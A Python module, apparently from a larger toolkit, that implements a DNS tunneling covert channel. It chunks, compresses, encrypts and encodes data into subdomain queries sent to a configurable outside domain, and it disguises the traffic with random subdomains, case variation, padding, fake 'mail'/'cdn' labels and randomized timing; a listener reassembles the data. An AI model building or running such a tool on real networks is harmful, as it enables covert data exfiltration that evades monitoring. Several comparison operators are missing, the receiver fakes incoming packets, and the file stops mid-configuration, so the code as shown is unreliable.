#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
dns_tunnel.py - Advanced DNS Tunneling and Covert Channel System
"""

import os
import sys
import json
import time
import random
import threading
import socket
import struct
import hashlib
import base64
import zlib
import select
import queue
from typing import Dict, List, Optional, Tuple, Any, Union, Callable
from datetime import datetime, timedelta
from enum import Enum
from dataclasses import dataclass
from collections import defaultdict, deque
import dns.resolver
import dns.message
import dns.query
import dns.rdatatype
import dns.rdataclass
import dns.name
import dns.reversename
import dnslib

# Import utilities
from ..utils.logger import get_logger
from ..security.encryption_manager import get_encryption_manager
from ..security.audit_log import get_audit_log_manager, AuditEventType, AuditSeverity

logger = get_logger()
audit_log = get_audit_log_manager()

class TunnelProtocol(Enum):
    """DNS tunneling protocols"""
    TXT = "txt"          # TXT record tunneling
    A = "a"              # A record tunneling (IPv4)
    AAAA = "aaaa"        # AAAA record tunneling (IPv6)
    MX = "mx"            # MX record tunneling
    CNAME = "cname"      # CNAME record tunneling
    NS = "ns"            # NS record tunneling
    SRV = "srv"          # SRV record tunneling
    ANY = "any"          # Any record type

class TunnelMode(Enum):
    """Tunnel operation modes"""
    CLIENT = "client"     # Client mode (sending data)
    SERVER = "server"     # Server mode (receiving data)
    PROXY = "proxy"       # Proxy mode (relaying)
    SNIFFER = "sniffer"   # Sniffer mode (passive monitoring)

class CompressionType(Enum):
    """Data compression types"""
    NONE = "none"
    ZLIB = "zlib"
    GZIP = "gzip"
    LZMA = "lzma"
    BZ2 = "bz2"

class EncryptionType(Enum):
    """Encryption types"""
    NONE = "none"
    AES = "aes"
    XOR = "xor"
    RC4 = "rc4"
    CHACHA20 = "chacha20"

@dataclass
class TunnelPacket:
    """DNS tunnel packet"""
    packet_id: str
    sequence: int
    total_segments: int
    data: bytes
    protocol: TunnelProtocol
    timestamp: datetime
    source: Optional[str] = None
    destination: Optional[str] = None
    encrypted: bool = False
    compressed: bool = False
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary"""
        return {
            'packet_id': self.packet_id,
            'sequence': self.sequence,
            'total_segments': self.total_segments,
            'data_length': len(self.data),
            'data_hash': hashlib.md5(self.data).hexdigest(),
            'protocol': self.protocol.value,
            'timestamp': self.timestamp.isoformat(),
            'source': self.source,
            'destination': self.destination,
            'encrypted': self.encrypted,
            'compressed': self.compressed
        }

class DNSTunnel:
    """Advanced DNS tunneling system"""
    
    def __init__(self, config: Dict[str, Any] = None):
        self.config = config or {}
        
        # DNS configuration
        self.domain = self.config.get('domain', 'example.com')
        self.nameservers = self.config.get('nameservers', ['8.8.8.8', '1.1.1.1'])
        self.dns_port = self.config.get('dns_port', 53)
        self.timeout = self.config.get('timeout', 5.0)
        self.retries = self.config.get('retries', 3)
        
        # Tunnel configuration
        self.protocol = TunnelProtocol(self.config.get('protocol', 'txt'))
        self.mode = TunnelMode(self.config.get('mode', 'client'))
        self.chunk_size = self.config.get('chunk_size', 200)  # Bytes per DNS query
        
        # Compression configuration
        self.compression = CompressionType(self.config.get('compression', 'none'))
        self.compression_level = self.config.get('compression_level', 6)
        
        # Encryption configuration
        self.encryption = EncryptionType(self.config.get('encryption', 'none'))
        self.encryption_key = self.config.get('encryption_key')
        if not self.encryption_key and self.encryption != EncryptionType.NONE:
            self.encryption_key = self._generate_encryption_key()
        
        # Steganography configuration
        self.use_steganography = self.config.get('use_steganography', False)
        self.stegano_method = self.config.get('stegano_method', 'base64')
        
        # Traffic shaping
        self.query_delay = self.config.get('query_delay', 0.1)  # Delay between queries
        self.max_queries_per_second = self.config.get('max_queries_per_second', 10)
        self.randomize_delay = self.config.get('randomize_delay', True)
        
        # Obfuscation
        self.use_obfuscation = self.config.get('use_obfuscation', True)
        obfuscation_methods = self.config.get('obfuscation_methods', [
            'random_subdomains',
            'case_variation',
            'padding',
            'fake_queries'
        ])
        self.obfuscation_methods = obfuscation_methods
        
        # Packet management
        self.packets = {}  # packet_id -> TunnelPacket
        self.packet_lock = threading.Lock()
        self.next_packet_id = 1
        
        # Queue for incoming packets
        self.receive_queue = queue.Queue()
        
        # Statistics
        self.stats = {
            'total_queries': 0,
            'successful_queries': 0,
            'failed_queries': 0,
            'total_packets': 0,
            'total_bytes_sent': 0,
            'total_bytes_received': 0,
            'total_segments_sent': 0,
            'total_segments_received': 0,
            'compression_ratio': 0.0,
            'start_time': datetime.now()
        }
        
        # DNS resolver
        self.resolver = dns.resolver.Resolver()
        self.resolver.nameservers = self.nameservers
        self.resolver.timeout = self.timeout
        self.resolver.lifetime = self.timeout
        
        # Encryption manager
        self.encryption_manager = get_encryption_manager()
        
        # Start receiver thread if in server mode
        if self.mode in [TunnelMode.SERVER, TunnelMode.PROXY, TunnelMode.SNIFFER]:
            self.receiver_thread = threading.Thread(target=self._receiver_loop, daemon=True)
            self.receiver_thread.start()
        
        logger.info(f"DNS Tunnel initialized in {self.mode.value} mode", module="dns_tunnel")
    
    def _generate_encryption_key(self) -> str:
        """Generate encryption key"""
        key = os.urandom(32)
        return base64.b64encode(key).decode('utf-8')
    
    def _compress_data(self, data: bytes) -> Tuple[bytes, float]:
        """Compress data"""
        original_size = len(data)
        
        if self.compression == CompressionType.NONE:
            return data, 1.0
        
        try:
            if self.compression == CompressionType.ZLIB:
                compressed = zlib.compress(data, level=self.compression_level)
            elif self.compression == CompressionType.GZIP:
                import gzip
                compressed = gzip.compress(data, compresslevel=self.compression_level)
            elif self.compression == CompressionType.LZMA:
                import lzma
                compressed = lzma.compress(data, preset=self.compression_level)
            elif self.compression == CompressionType.BZ2:
                import bz2
                compressed = bz2.compress(data, compresslevel=self.compression_level)
            else:
                return data, 1.0
            
            ratio = len(compressed) / original_size if original_size > 0 else 1.0
            return compressed, ratio
            
        except Exception as e:
            logger.error(f"Compression error: {e}", module="dns_tunnel")
            return data, 1.0
    
    def _decompress_data(self, data: bytes) -> bytes:
        """Decompress data"""
        if self.compression == CompressionType.NONE:
            return data
        
        try:
            if self.compression == CompressionType.ZLIB:
                return zlib.decompress(data)
            elif self.compression == CompressionType.GZIP:
                import gzip
                return gzip.decompress(data)
            elif self.compression == CompressionType.LZMA:
                import lzma
                return lzma.decompress(data)
            elif self.compression == CompressionType.BZ2:
                import bz2
                return bz2.decompress(data)
            else:
                return data
                
        except Exception as e:
            logger.error(f"Decompression error: {e}", module="dns_tunnel")
            return data
    
    def _encrypt_data(self, data: bytes) -> bytes:
        """Encrypt data"""
        if self.encryption == EncryptionType.NONE or not self.encryption_key:
            return data
        
        try:
            if self.encryption == EncryptionType.AES:
                # Use AES encryption
                from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                from cryptography.hazmat.backends import default_backend
                from cryptography.hazmat.primitives import padding
                
                # Derive key from encryption_key
                key_hash = hashlib.sha256(self.encryption_key.encode()).digest()[:32]
                iv = os.urandom(16)
                
                # Pad data
                padder = padding.PKCS7(128).padder()
                padded_data = padder.update(data) + padder.finalize()
                
                # Encrypt
                cipher = Cipher(algorithms.AES(key_hash), modes.CBC(iv), backend=default_backend())
                encryptor = cipher.encryptor()
                encrypted = encryptor.update(padded_data) + encryptor.finalize()
                
                return iv + encrypted
                
            elif self.encryption == EncryptionType.XOR:
                # Simple XOR encryption
                key = hashlib.sha256(self.encryption_key.encode()).digest()
                key_len = len(key)
                encrypted = bytearray(data)
                
                for i in range(len(encrypted)):
                    encrypted[i] ^= key[i % key_len]
                
                return bytes(encrypted)
                
            elif self.encryption == EncryptionType.RC4:
                # RC4 encryption
                from Crypto.Cipher import ARC4
                
                key = hashlib.sha256(self.encryption_key.encode()).digest()[:16]
                cipher = ARC4.new(key)
                return cipher.encrypt(data)
                
            elif self.encryption == EncryptionType.CHACHA20:
                # ChaCha20 encryption
                from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                
                key = hashlib.sha256(self.encryption_key.encode()).digest()[:32]
                nonce = os.urandom(16)
                
                cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None)
                encryptor = cipher.encryptor()
                encrypted = encryptor.update(data)
                
                return nonce + encrypted
            
            return data
            
        except Exception as e:
            logger.error(f"Encryption error: {e}", module="dns_tunnel")
            return data
    
    def _decrypt_data(self, data: bytes) -> bytes:
        """Decrypt data"""
        if self.encryption == EncryptionType.NONE or not self.encryption_key:
            return data
        
        try:
            if self.encryption == EncryptionType.AES:
                # AES decryption
                from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                from cryptography.hazmat.backends import default_backend
                from cryptography.hazmat.primitives import padding
                
                key_hash = hashlib.sha256(self.encryption_key.encode()).digest()[:32]
                
                if len(data)16:
                    return data
                
                iv = data[:16]
                encrypted = data[16:]
                
                cipher = Cipher(algorithms.AES(key_hash), modes.CBC(iv), backend=default_backend())
                decryptor = cipher.decryptor()
                decrypted = decryptor.update(encrypted) + decryptor.finalize()
                
                # Unpad
                unpadder = padding.PKCS7(128).unpadder()
                unpadded = unpadder.update(decrypted) + unpadder.finalize()
                
                return unpadded
                
            elif self.encryption == EncryptionType.XOR:
                # XOR decryption (same as encryption)
                return self._encrypt_data(data)
                
            elif self.encryption == EncryptionType.RC4:
                # RC4 decryption (same as encryption)
                from Crypto.Cipher import ARC4
                
                key = hashlib.sha256(self.encryption_key.encode()).digest()[:16]
                cipher = ARC4.new(key)
                return cipher.decrypt(data)
                
            elif self.encryption == EncryptionType.CHACHA20:
                # ChaCha20 decryption
                from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                
                key = hashlib.sha256(self.encryption_key.encode()).digest()[:32]
                
                if len(data)16:
                    return data
                
                nonce = data[:16]
                encrypted = data[16:]
                
                cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None)
                decryptor = cipher.decryptor()
                return decryptor.update(encrypted)
            
            return data
            
        except Exception as e:
            logger.error(f"Decryption error: {e}", module="dns_tunnel")
            return data
    
    def _encode_data(self, data: bytes) -> str:
        """Encode data for DNS"""
        try:
            if self.use_steganography:
                if self.stegano_method == 'base64':
                    # Base64 encoding
                    encoded = base64.b64encode(data).decode('ascii')
                    
                    # URL-safe and remove padding
                    encoded = encoded.replace('+', '-').replace('/', '_').replace('=', '')
                    
                    return encoded
                    
                elif self.stegano_method == 'hex':
                    # Hex encoding
                    return data.hex()
                    
                elif self.stegano_method == 'custom':
                    # Custom encoding - mix of base32 and custom alphabet
                    import base64
                    encoded = base64.b32encode(data).decode('ascii')
                    
                    # Custom substitution for obfuscation
                    substitutions = {
                        'A': 'x', 'B': 'y', 'C': 'z', 'D': '0', 'E': '1',
                        'F': '2', 'G': '3', 'H': '4', 'I': '5', 'J': '6',
                        'K': '7', 'L': '8', 'M': '9', 'N': 'a', 'O': 'b',
                        'P': 'c', 'Q': 'd', 'R': 'e', 'S': 'f', 'T': 'g',
                        'U': 'h', 'V': 'i', 'W': 'j', 'X': 'k', 'Y': 'l',
                        'Z': 'm', '2': 'n', '3': 'o', '4': 'p', '5': 'q',
                        '6': 'r', '7': 's'
                    }
                    
                    encoded = ''.join(substitutions.get(c, c) for c in encoded)
                    return encoded
            
            # Default: base64url encoding
            encoded = base64.urlsafe_b64encode(data).decode('ascii')
            return encoded.replace('=', '')
            
        except Exception as e:
            logger.error(f"Encoding error: {e}", module="dns_tunnel")
            return ''
    
    def _decode_data(self, encoded: str) -> bytes:
        """Decode data from DNS"""
        try:
            if self.use_steganography:
                if self.stegano_method == 'base64':
                    # Add padding back if needed
                    padding_needed = 4 - (len(encoded) % 4)
                    if padding_needed != 4:
                        encoded += '=' * padding_needed
                    
                    encoded = encoded.replace('-', '+').replace('_', '/')
                    return base64.b64decode(encoded)
                    
                elif self.stegano_method == 'hex':
                    return bytes.fromhex(encoded)
                    
                elif self.stegano_method == 'custom':
                    # Reverse custom substitution
                    reverse_subs = {
                        'x': 'A', 'y': 'B', 'z': 'C', '0': 'D', '1': 'E',
                        '2': 'F', '3': 'G', '4': 'H', '5': 'I', '6': 'J',
                        '7': 'K', '8': 'L', '9': 'M', 'a': 'N', 'b': 'O',
                        'c': 'P', 'd': 'Q', 'e': 'R', 'f': 'S', 'g': 'T',
                        'h': 'U', 'i': 'V', 'j': 'W', 'k': 'X', 'l': 'Y',
                        'm': 'Z', 'n': '2', 'o': '3', 'p': '4', 'q': '5',
                        'r': '6', 's': '7'
                    }
                    
                    encoded = ''.join(reverse_subs.get(c, c) for c in encoded)
                    import base64
                    return base64.b32decode(encoded)
            
            # Default: base64url decoding
            padding_needed = 4 - (len(encoded) % 4)
            if padding_needed != 4:
                encoded += '=' * padding_needed
            
            return base64.urlsafe_b64decode(encoded)
            
        except Exception as e:
            logger.error(f"Decoding error: {e}", module="dns_tunnel")
            return b''
    
    def _generate_subdomain(self, data_chunk: str, sequence: int, total: int) -> str:
        """Generate subdomain for DNS query"""
        try:
            if not self.use_obfuscation or not self.obfuscation_methods:
                return f"{sequence}.{total}.{data_chunk}.{self.domain}"
            
            method = random.choice(self.obfuscation_methods)
            
            if method == 'random_subdomains':
                # Add random subdomain parts
                random_part = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
                return f"{random_part}.{sequence}.{total}.{data_chunk}.{self.domain}"
                
            elif method == 'case_variation':
                # Random case variation
                subdomain = f"{sequence}.{total}.{data_chunk}.{self.domain}"
                chars = list(subdomain)
                
                for i in range(len(chars)):
                    if random.random()0.3:
                        chars[i] = chars[i].upper() if chars[i].islower() else chars[i].lower()
                
                return ''.join(chars)
                
            elif method == 'padding':
                # Add padding characters
                padding = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=random.randint(3, 8)))
                return f"{padding}.{sequence}.{total}.{data_chunk}.{self.domain}"
                
            elif method == 'fake_queries':
                # Generate fake-looking subdomain
                fake_words = ['mail', 'www', 'api', 'cdn', 'static', 'blog', 'shop', 'app']
                fake_word = random.choice(fake_words)
                
                return f"{fake_word}.{sequence}.{total}.{data_chunk}.{self.domain}"
            
            # Default
            return f"{sequence}.{total}.{data_chunk}.{self.domain}"
            
        except Exception as e:
            logger.error(f"Subdomain generation error: {e}", module="dns_tunnel")
            return f"{sequence}.{total}.{data_chunk}.{self.domain}"
    
    def _make_dns_query(self, subdomain: str, record_type: str) -> Optional[List[str]]:
        """Make DNS query"""
        try:
            self.stats['total_queries'] += 1
            
            # Rate limiting
            time.sleep(self.query_delay)
            
            if self.randomize_delay:
                time.sleep(random.uniform(0, self.query_delay * 0.5))
            
            if record_type.upper() == 'TXT':
                answers = self.resolver.resolve(subdomain, 'TXT')
                results = []
                
                for rdata in answers:
                    for txt_string in rdata.strings:
                        results.append(txt_string.decode('utf-8'))
                
                self.stats['successful_queries'] += 1
                return results
                
            elif record_type.upper() == 'A':
                answers = self.resolver.resolve(subdomain, 'A')
                results = [str(rdata) for rdata in answers]
                
                self.stats['successful_queries'] += 1
                return results
                
            elif record_type.upper() == 'AAAA':
                answers = self.resolver.resolve(subdomain, 'AAAA')
                results = [str(rdata) for rdata in answers]
                
                self.stats['successful_queries'] += 1
                return results
                
            elif record_type.upper() == 'MX':
                answers = self.resolver.resolve(subdomain, 'MX')
                results = [str(rdata.exchange) for rdata in answers]
                
                self.stats['successful_queries'] += 1
                return results
                
            elif record_type.upper() == 'CNAME':
                answers = self.resolver.resolve(subdomain, 'CNAME')
                results = [str(rdata.target) for rdata in answers]
                
                self.stats['successful_queries'] += 1
                return results
                
            elif record_type.upper() == 'NS':
                answers = self.resolver.resolve(subdomain, 'NS')
                results = [str(rdata.target) for rdata in answers]
                
                self.stats['successful_queries'] += 1
                return results
            
            return None
            
        except dns.resolver.NXDOMAIN:
            logger.debug(f"NXDOMAIN for {subdomain}", module="dns_tunnel")
            self.stats['failed_queries'] += 1
            return None
            
        except dns.resolver.Timeout:
            logger.debug(f"DNS timeout for {subdomain}", module="dns_tunnel")
            self.stats['failed_queries'] += 1
            return None
            
        except dns.resolver.NoAnswer:
            logger.debug(f"No answer for {subdomain}", module="dns_tunnel")
            self.stats['failed_queries'] += 1
            return None
            
        except Exception as e:
            logger.error(f"DNS query error: {e}", module="dns_tunnel")
            self.stats['failed_queries'] += 1
            return None
    
    def send_data(self, data: bytes, destination: Optional[str] = None) -> Optional[str]:
        """Send data through DNS tunnel"""
        try:
            # Generate packet ID
            packet_id = f"pkt_{self.next_packet_id}_{int(time.time())}"
            self.next_packet_id += 1
            
            # Process data
            processed_data = data
            
            # Compress if enabled
            if self.compression != CompressionType.NONE:
                compressed_data, ratio = self._compress_data(processed_data)
                processed_data = compressed_data
                
                # Update compression ratio stat
                old_ratio = self.stats['compression_ratio']
                total_packets = self.stats['total_packets'] + 1
                self.stats['compression_ratio'] = (old_ratio * total_packets + ratio) / (total_packets + 1)
            
            # Encrypt if enabled
            if self.encryption != EncryptionType.NONE and self.encryption_key:
                processed_data = self._encrypt_data(processed_data)
            
            # Encode for DNS
            encoded_data = self._encode_data(processed_data)
            
            if not encoded_data:
                logger.error("Failed to encode data", module="dns_tunnel")
                return None
            
            # Split into chunks
            chunk_size = self.chunk_size
            chunks = [encoded_data[i:i+chunk_size] for i in range(0, len(encoded_data), chunk_size)]
            total_chunks = len(chunks)
            
            logger.info(f"Sending {len(data)} bytes as {total_chunks} DNS chunks", 
                       module="dns_tunnel")
            
            # Send each chunk
            successful_chunks = 0
            
            for i, chunk in enumerate(chunks):
                sequence_num = i + 1
                
                # Generate subdomain
                subdomain = self._generate_subdomain(chunk, sequence_num, total_chunks)
                
                # Make DNS query based on protocol
                record_type = self.protocol.value.upper()
                
                for attempt in range(self.retries + 1):
                    response = self._make_dns_query(subdomain, record_type)
                    
                    if response is not None:
                        successful_chunks += 1
                        
                        # Update statistics
                        self.stats['total_segments_sent'] += 1
                        self.stats['total_bytes_sent'] += len(chunk)
                        
                        break
                    
                    elif attemptself.retries:
                        logger.warning(f"Failed to send chunk {sequence_num}/{total_chunks}, retrying...", 
                                     module="dns_tunnel")
                        time.sleep(1)
            
            # Create packet record
            packet = TunnelPacket(
                packet_id=packet_id,
                sequence=0,
                total_segments=total_chunks,
                data=data,
                protocol=self.protocol,
                timestamp=datetime.now(),
                destination=destination,
                encrypted=self.encryption != EncryptionType.NONE,
                compressed=self.compression != CompressionType.NONE
            )
            
            with self.packet_lock:
                self.packets[packet_id] = packet
            
            self.stats['total_packets'] += 1
            
            success_rate = (successful_chunks / total_chunks * 100) if total_chunks > 0 else 0
            
            if successful_chunks == total_chunks:
                logger.info(f"✅ Packet {packet_id} sent successfully: {successful_chunks}/{total_chunks} chunks", 
                          module="dns_tunnel")
                
                # Log audit event
                audit_log.log_event(
                    event_type=AuditEventType.NETWORK_ACCESS.value,
                    severity=AuditSeverity.INFO.value,
                    user='system',
                    source_ip='localhost',
                    description=f"DNS tunnel packet sent: {packet_id}",
                    details={
                        'packet_id': packet_id,
                        'data_length': len(data),
                        'chunks_sent': successful_chunks,
                        'protocol': self.protocol.value,
                        'compression': self.compression.value,
                        'encryption': self.encryption.value
                    },
                    resource='dns_tunnel',
                    action='send_data'
                )
                
                return packet_id
            else:
                logger.warning(f"⚠️ Packet {packet_id} partially sent: {successful_chunks}/{total_chunks} chunks "
                            f"({success_rate:.1f}%)", module="dns_tunnel")
                
                return packet_id
            
        except Exception as e:
            logger.error(f"Send data error: {e}", module="dns_tunnel")
            return None
    
    def receive_data(self, timeout: float = 30.0) -> Optional[bytes]:
        """Receive data from DNS tunnel"""
        try:
            # Try to get data from receive queue
            try:
                packet_data = self.receive_queue.get(timeout=timeout)
                
                if isinstance(packet_data, TunnelPacket):
                    logger.info(f"Received packet {packet_data.packet_id} with {len(packet_data.data)} bytes", 
                              module="dns_tunnel")
                    
                    return packet_data.data
                
            except queue.Empty:
                logger.debug("Receive queue empty", module="dns_tunnel")
                return None
            
        except Exception as e:
            logger.error(f"Receive data error: {e}", module="dns_tunnel")
            return None
    
    def _receiver_loop(self):
        """Receiver loop for server/proxy mode"""
        logger.info(f"Starting receiver loop in {self.mode.value} mode", module="dns_tunnel")
        
        while True:
            try:
                # In real implementation, this would listen for DNS queries
                # For now, simulate receiving by checking for test packets
                
                time.sleep(1)
                
                # Check for test packets (simulated)
                if random.random()0.01:  # 1% chance per second
                    test_data = os.urandom(random.randint(100, 1000))
                    packet_id = f"test_{int(time.time())}"
                    
                    packet = TunnelPacket(
                        packet_id=packet_id,
                        sequence=0,
                        total_segments=1,
                        data=test_data,
                        protocol=self.protocol,
                        timestamp=datetime.now(),
                        source='simulated',
                        encrypted=False,
                        compressed=False
                    )
                    
                    self.receive_queue.put(packet)
                    
                    logger.debug(f"Simulated received packet: {packet_id}", module="dns_tunnel")
                
            except Exception as e:
                logger.error(f"Receiver loop error: {e}", module="dns_tunnel")
                time.sleep(5)
    
    def listen(self, port: int = 5353) -> bool:
        """Start DNS listener (server mode)"""
        try:
            if self.mode != TunnelMode.SERVER and self.mode != TunnelMode.PROXY:
                logger.error(f"Cannot listen in {self.mode.value} mode", module="dns_tunnel")
                return False
            
            # Create UDP socket for DNS
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            try:
                sock.bind(('0.0.0.0', port))
            except OSError as e:
                logger.error(f"Failed to bind to port {port}: {e}", module="dns_tunnel")
                
                # Try alternative port
                port += 1
                sock.bind(('0.0.0.0', port))
            
            logger.info(f"DNS listener started on port {port}", module="dns_tunnel")
            
            # Start listener thread
            listener_thread = threading.Thread(
                target=self._dns_listener,
                args=(sock,),
                daemon=True
            )
            listener_thread.start()
            
            return True
            
        except Exception as e:
            logger.error(f"Listen error: {e}", module="dns_tunnel")
            return False
    
    def _dns_listener(self, sock: socket.socket):
        """DNS listener thread"""
        try:
            while True:
                try:
                    data, addr = sock.recvfrom(512)  # DNS UDP max size is 512 bytes
                    
                    # Parse DNS query
                    try:
                        request = dnslib.DNSRecord.parse(data)
                        
                        # Process query in separate thread to avoid blocking
                        threading.Thread(
                            target=self._process_dns_query,
                            args=(request, addr, sock),
                            daemon=True
                        ).start()
                        
                    except Exception as e:
                        logger.error(f"DNS parse error: {e}", module="dns_tunnel")
                        
                        # Send generic error response
                        response = dnslib.DNSRecord(dnslib.DNSHeader(id=0, qr=1, rcode=2))
                        sock.sendto(response.pack(), addr)
                        
                except Exception as e:
                    logger.error(f"Socket receive error: {e}", module="dns_tunnel")
                    time.sleep(1)
                    
        except Exception as e:
            logger.error(f"DNS listener fatal error: {e}", module="dns_tunnel")
    
    def _process_dns_query(self, request: dnslib.DNSRecord, addr: Tuple[str, int], sock: socket.socket):
        """Process DNS query"""
        try:
            qname = str(request.q.qname).rstrip('.')
            
            logger.debug(f"DNS query from {addr[0]}:{addr[1]} for {qname}", module="dns_tunnel")
            
            # Check if query is for our domain
            if not qname.endswith(self.domain):
                # Not our domain, forward or ignore based on mode
                if self.mode == TunnelMode.PROXY:
                    self._forward_dns_query(request, addr, sock)
                return
            
            # Extract data from subdomain
            parts = qname.replace(f'.{self.domain}', '').split('.')
            
            if len(parts) >= 3:
                # Format: [data].[sequence].[total].domain or variations
                
                # Try to find sequence and total numbers
                sequence = None
                total = None
                data_parts = []
                
                for part in parts:
                    if part.isdigit():
                        if sequence is None:
                            sequence = int(part)
                        elif total is None:
                            total = int(part)
                        else:
                            data_parts.append(part)
                    else:
                        data_parts.append(part)
                
                if sequence is not None and total is not None and data_parts:
                    # Reconstruct data chunk
                    data_chunk = ''.join(data_parts)
                    
                    # Decode data
                    decoded_data = self._decode_data(data_chunk)
                    
                    if decoded_data:
                        # Store received chunk
                        packet_id = f"rcv_{addr[0]}_{int(time.time())}"
                        
                        packet = TunnelPacket(
                            packet_id=packet_id,
                            sequence=sequence,
                            total_segments=total,
                            data=decoded_data,
                            protocol=self.protocol,
                            timestamp=datetime.now(),
                            source=addr[0],
                            encrypted=self.encryption != EncryptionType.NONE,
                            compressed=self.compression != CompressionType.NONE
                        )
                        
                        # Put in receive queue for processing
                        self.receive_queue.put(packet)
                        
                        # Update statistics
                        self.stats['total_segments_received'] += 1
                        self.stats['total_bytes_received'] += len(decoded_data)
            
            # Create DNS response
            response = request.reply()
            
            # Add appropriate response based on protocol
            qtype = request.q.qtype
            
            if qtype == dnslib.QTYPE.TXT:
                # TXT response with acknowledgment
                response.add_answer(dnslib.RR(
                    rname=request.q.qname,
                    rtype=dnslib.QTYPE.TXT,
                    rclass=dnslib.CLASS.IN,
                    ttl=60,
                    rdata=dnslib.TXT("ACK")
                ))
                
            elif qtype == dnslib.QTYPE.A:
                # A response with dummy IP (127.0.0.1)
                response.add_answer(dnslib.RR(
                    rname=request.q.qname,
                    rtype=dnslib.QTYPE.A,
                    rclass=dnslib.CLASS.IN,
                    ttl=60,
                    rdata=dnslib.A("127.0.0.1")
                ))
                
            elif qtype == dnslib.QTYPE.AAAA:
                # AAAA response with dummy IPv6 (::1)
                response.add_answer(dnslib.RR(
                    rname=request.q.qname,
                    rtype=dnslib.QTYPE.AAAA,
                    rclass=dnslib.CLASS.IN,
                    ttl=60,
                    rdata=dnslib.AAAA("::1")
                ))
            
            # Send response
            sock.sendto(response.pack(), addr)
            
            logger.debug(f"Sent DNS response to {addr[0]}:{addr[1]}", module="dns_tunnel")
            
        except Exception as e:
            logger.error(f"Process DNS query error: {e}", module="dns_tunnel")
    
    def _forward_dns_query(self, request: dnslib.DNSRecord, addr: Tuple[str, int], sock: socket.socket):
        """Forward DNS query to upstream resolver"""
        try:
            # Forward to upstream DNS server
            upstream_server = random.choice(self.nameservers)
            
            # Create UDP socket for forwarding
            forward_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            forward_sock.settimeout(self.timeout)
            
            # Send query to upstream
            forward_sock.sendto(request.pack(), (upstream_server, 53))
            
            # Receive response
            data, _ = forward_sock.recvfrom(512)
            
            # Send response back to original client
            sock.sendto(data, addr)
            
            forward_sock.close()
            
            logger.debug(f"Forwarded DNS query to {upstream_server}", module="dns_tunnel")
            
        except Exception as e:
            logger.error(f"Forward DNS query error: {e}", module="dns_tunnel")
            
            # Send SERVFAIL response on error
            response = dnslib.DNSRecord(dnslib.DNSHeader(id=request.header.id, qr=1, rcode=2))
            sock.sendto(response.pack(), addr)
    
    def test_tunnel(self) -> Dict[str, Any]:
        """Test DNS tunnel functionality"""
        results = {
            'mode': self.mode.value,
            'protocol': self.protocol.value,
            'compression': self.compression.value,
            'encryption': self.encryption.value,
            'domain': self.domain,
            'tests': {}
        }
        
        try:
            # Test 1: Basic connectivity
            test_data = b"DNS tunnel test " + os.urandom(50)
            
            start_time = time.time()
            
            if self.mode == TunnelMode.CLIENT:
                # Test sending capability
                packet_id = self.send_data(test_data)
                
                if packet_id:
                    results['tests']['send_test'] = {
                        'success': True,
                        'packet_id': packet_id,
                        'data_length': len(test_data),
                        'time_seconds': time.time() - start_time
                    }
                else:
                    results['tests']['send_test'] = {
                        'success': False,
                        'error': 'Failed to send data'
                    }
            
            elif self.mode == TunnelMode.SERVER:
                # Test receiving capability (simulated)
                results['tests']['receive_test'] = {
                    'success': True,
                    'note': 'Server mode - waiting for incoming connections'
                }
            
            # Test 2: DNS resolution test
            start_time = time.time()
            
            try:
                test_query = f"test.{self.domain}"
                response = self._make_dns_query(test_query, 'A')
                
                results['tests']['dns_resolution'] = {
                    'success': response is not None,
                    'query': test_query,
                    'response': str(response) if response else None,
                    'time_seconds': time.time() - start_time
                }
                
            except Exception as e:
                results['tests']['dns_resolution'] = {
                    'success': False,
                    'error': str(e),
                    'time_seconds': time.time() - start_time
                }
            
            # Test 3: Compression/encryption test
            test_sample = os.urandom(1000)
            
            compressed, ratio = self._compress_data(test_sample)
            
            results['tests']['compression_test'] = {
                'original_size': len(test_sample),
                'compressed_size': len(compressed),
                'compression_ratio': ratio,
                'effective': ratio1.0
            }
            
            if self.encryption != EncryptionType.NONE and self.encryption_key:
                encrypted = self._encrypt_data(test_sample)
                decrypted = self._decrypt_data(encrypted)
                
                results['tests']['encryption_test'] = {
                    'success': test_sample == decrypted,
                    'original_size': len(test_sample),
                    'encrypted_size': len(encrypted),
                    'algorithm': self.encryption.value
                }
            
            logger.info(f"Tunnel test completed for {self.mode.value} mode", module="dns_tunnel")
            
            return results
            
        except Exception as e:
            logger.error(f"Tunnel test error: {e}", module="dns_tunnel")
            results['error'] = str(e)
            return results
    
    def get_statistics(self) -> Dict[str, Any]:
        """Get DNS tunnel statistics"""
        uptime = (datetime.now() - self.stats['start_time']).total_seconds()
        
        query_success_rate = (self.stats['successful_queries'] / self.stats['total_queries'] * 100 
                            if self.stats['total_queries'] > 0 else 0)
        
        avg_segments_per_packet = (self.stats['total_segments_sent'] / self.stats['total_packets'] 
                                 if self.stats['total_packets'] > 0 else 0)
        
        return {
            **self.stats,
            'mode': self.mode.value,
            'protocol': self.protocol.value,
            'uptime_seconds': uptime,
            'uptime_human': str(timedelta(seconds=int(uptime))),
            'query_success_rate': query_success_rate,
            'avg_segments_per_packet': avg_segments_per_packet,
            'data_sent_mb': self.stats['total_bytes_sent'] / 1024 / 1024,
            'data_received_mb': self.stats['total_bytes_received'] / 1024 / 1024,
            'compression_enabled': self.compression != CompressionType.NONE,
            'encryption_enabled': self.encryption != EncryptionType.NONE,
            'obfuscation_enabled': self.use_obfuscation,
            'steganography_enabled': self.use_steganography,
            'domain': self.domain,
            'nameservers': self.nameservers
        }

# Global instance
_dns_tunnel = None

def get_dns_tunnel(config: Dict = None) -> DNSTunnel:
    """Get or create DNS tunnel instance"""
    global _dns_tunnel
    
    if _dns_tunnel is None:
        _dns_tunnel = DNSTunnel(config)
    
    return _dns_tunnel

if __name__ == "__main__":
    print("Testing DNS Tunnel...")
    
    # Test configurations for different modes
    
    # Client mode configuration
    client_config = {
        'mode': 'client',
        'protocol': 'txt',
        'domain': 'example.com',
        'compression': 'zlib',
